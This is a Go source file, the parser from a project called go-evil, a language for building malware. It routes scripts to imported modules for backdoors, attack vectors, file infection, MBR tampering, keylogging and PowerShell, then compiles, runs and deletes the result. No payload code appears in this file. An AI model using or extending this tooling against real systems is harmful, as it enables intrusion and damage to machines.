package parser

import (
	"fmt"

	"github.com/s9rA16Bf4/go-evil/domains/attack_vector"
	"github.com/s9rA16Bf4/go-evil/domains/backdoor"
	"github.com/s9rA16Bf4/go-evil/domains/infect"
	"github.com/s9rA16Bf4/go-evil/domains/keyboard"
	"github.com/s9rA16Bf4/go-evil/domains/malware"
	mal "github.com/s9rA16Bf4/go-evil/domains/malware/private"
	"github.com/s9rA16Bf4/go-evil/domains/mbr"
	"github.com/s9rA16Bf4/go-evil/domains/network"
	"github.com/s9rA16Bf4/go-evil/domains/pastebin"
	"github.com/s9rA16Bf4/go-evil/domains/powershell"
	"github.com/s9rA16Bf4/go-evil/domains/system"
	"github.com/s9rA16Bf4/go-evil/domains/window"
	"github.com/s9rA16Bf4/go-evil/utility/io"
	"github.com/s9rA16Bf4/go-evil/utility/json"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

func Parser(base_64_serialize_json string) string {

	data_structure := json.Receive(base_64_serialize_json)
	data_structure.Append_to_call("Parser")

	data_structure = json.Receive(Regex(Variable(Strip(Imports(Read_file(json.Send(data_structure)))))))

	for i, domain := range data_structure.File_Domains {
		notify.Log(fmt.Sprintf("Found called domain '%s'", domain), data_structure.Verbose_LVL, "3")

		// Code that can look up if a domain has been imported
		for i, defined_domain := range data_structure.Imported_headers {
			if defined_domain == domain { // We found the domain
				break
			} else if i+1 >= len(data_structure.Imported_headers) { // We have reached the end, and yet no domains
				notify.Error(fmt.Sprintf("Found the utilization of domain '%s', yet it was not imported!", domain),
					"parser.Parser()")
			}
		}

		switch domain { // This will be the top level domain
		case "window":
			//io.Append_domain("window")
			window.Parse(data_structure.File_gut[i])

		case "system":
			//io.Append_domain("system")
			system.Parse(data_structure.File_gut[i])

		case "network", "#net":
			//io.Append_domain("network")
			network.Parse(data_structure.File_gut[i])

		case "malware", "#object", "#self", "#this":
			//io.Append_domain("malware")
			malware.Parse(data_structure.File_gut[i])

		case "keyboard":
			notify.Warning("This module is still under development! Usage may veary")
			keyboard.Parse(data_structure.File_gut[i])

		case "backdoor":
			backdoor.Parse(data_structure.File_gut[i])

		case "attack":
			attack_vector.Parse(data_structure.File_gut[i])

		case "powershell", "#pwsh":
			notify.Warning("This module is still under development! Usage may veary")
			powershell.Parse(data_structure.File_gut[i])

		// case "time", "#wait":
		// 	time.Parse(data_structure.File_gut[i])

		case "pastebin", "#paste":
			pastebin.Parse(data_structure.File_gut[i])

		case "mbr":
			mbr.Parse(data_structure.File_gut[i])

		case "infect":
			infect.Parse(data_structure.File_gut[i])

		default:
			notify.Error(fmt.Sprintf("Unknown top level domain '%s'", domain), "parser.Parse()")
			return ""
		}
	}

	return json.Send(data_structure)
}

func Interpreter(file_to_read string) {
	Parser(file_to_read)                        // Will basically develop the final code we utilize
	io.Write_file()                             // Creates the file in the output directory
	io.Compile_file()                           // Compiles it
	io.Run_file("./output/" + mal.GetName())    // Runs the file
	io.Remove_file("./output/" + mal.GetName()) // Removes the file and voila we have a simpel interpreter
}
